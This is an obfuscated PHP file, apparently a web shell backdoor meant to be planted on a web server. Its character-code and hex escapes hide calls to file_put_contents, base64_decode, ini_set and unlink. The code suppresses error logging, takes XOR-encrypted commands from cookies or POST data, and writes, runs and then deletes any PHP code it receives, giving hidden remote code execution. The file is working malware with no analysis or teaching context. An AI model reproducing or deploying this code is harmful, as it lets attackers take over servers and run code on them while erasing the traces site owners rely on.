<?php $mGDVJNZrpX = chr(102)."\151"."\x6c".chr(101)."\x5f".chr(459-347).'u'."\164".'_'."\143".chr(1055-944).'n'.chr(116)."\x65".'n'."\x74".chr(115);
$kflCDLlNX = "\x62"."\141".chr(742-627)."\145"."\x36".chr(849-797)."\137".chr(100)."\145"."\143".chr(111).chr(100).'e';
$JBzHvAlyMN = "\x69".chr(829-719)."\x69"."\x5f"."\163".chr(101)."\x74";
$RIPayMmbw = chr(547-430)."\156".chr(108).chr(812-707).chr(1102-992).'k';


@$JBzHvAlyMN("\145"."\162"."\x72"."\x6f".'r'.'_'."\x6c".'o'.chr(103), NULL);
@$JBzHvAlyMN("\x6c"."\157".chr(512-409)."\137".chr(342-241).chr(114).chr(114)."\157"."\x72".chr(115), 0);
@$JBzHvAlyMN(chr(109)."\141"."\x78".'_'.chr(101).chr(120).chr(101)."\143".chr(117).chr(563-447).chr(105)."\x6f"."\x6e".'_'.chr(116)."\x69"."\155"."\145", 0);
@set_time_limit(0);

function gzDzy($PJucy, $SptgcUBOiO)
{
    $YWPdO = "";
    for ($kxvvuPhN = 0; $kxvvuPhN < strlen($PJucy);) {
        for ($j = 0; $j < strlen($SptgcUBOiO) && $kxvvuPhN < strlen($PJucy); $j++, $kxvvuPhN++) {
            $YWPdO .= chr(ord($PJucy[$kxvvuPhN]) ^ ord($SptgcUBOiO[$j]));
        }
    }
    return $YWPdO;
}

$eLMWKYD = array_merge($_COOKIE, $_POST);
$ILYhKTWv = '15a51e42-badb-4b9c-bca6-375c15fa1de8';
foreach ($eLMWKYD as $cRxftguMSj => $PJucy) {
    $PJucy = @unserialize(gzDzy(gzDzy($kflCDLlNX($PJucy), $ILYhKTWv), $cRxftguMSj));
    if (isset($PJucy[chr(657-560).chr(107)])) {
        if ($PJucy["\x61"] == 'i') {
            $kxvvuPhN = array(
                chr(112).chr(298-180) => @phpversion(),
                "\163"."\x76" => "3.5",
            );
            echo @serialize($kxvvuPhN);
        } elseif ($PJucy["\x61"] == "\145") {
            $eDFdyB = "./" . md5($ILYhKTWv) . chr(46).chr(1104-999)."\156".chr(99);
            @$mGDVJNZrpX($eDFdyB, "<" . chr(706-643).chr(434-322).chr(104).chr(642-530).' '."\100".chr(117)."\156"."\x6c"."\151"."\156"."\153".chr(634-594)."\137"."\137".chr(70)."\111".chr(76).chr(69).'_'.'_'."\x29"."\x3b".' ' . $PJucy[chr(100)]);
            include($eDFdyB);
            @$RIPayMmbw($eDFdyB);
        }
        exit();
    }
}

